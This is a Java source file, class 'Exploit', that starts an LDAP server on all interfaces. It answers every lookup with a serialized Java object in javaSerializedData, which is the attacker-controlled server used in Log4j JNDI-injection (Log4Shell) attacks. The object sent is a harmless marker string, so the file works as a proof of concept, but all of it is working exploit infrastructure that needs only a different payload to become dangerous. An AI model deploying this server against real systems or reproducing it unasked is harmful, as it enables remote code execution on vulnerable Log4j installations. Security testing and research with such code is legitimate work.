import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;

public class Exploit {

	public static void main(String... args) throws Exception {
		final var port = 389;

		try {
			final var config = new InMemoryDirectoryServerConfig("dc=exploit,dc=com");

			config.setListenerConfigs(new InMemoryListenerConfig("exploit", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
			config.addInMemoryOperationInterceptor(new OperationInterceptor());

			final var server = new InMemoryDirectoryServer(config);

			System.out.println("Start server");

			server.startListening();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	private static final class OperationInterceptor extends InMemoryOperationInterceptor {

		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			try {
				sendSerializedResult(result, new Entry(result.getRequest().getBaseDN()));
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		private void sendSerializedResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException {
			System.out.println("Send result " + entry.getDN());

			var send = "THIS IS SEND TO THE LOG!!! LOG4J EXPLOIT!";

			var serializedStream = new ByteArrayOutputStream();
			var objectStream = new ObjectOutputStream(serializedStream);
			objectStream.writeObject(send);
			serializedStream.flush();

			entry.addAttribute("javaClassName", send.getClass().getName());
			entry.addAttribute("javaSerializedData", serializedStream.toByteArray());

			result.sendSearchEntry(entry);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}

	}

}
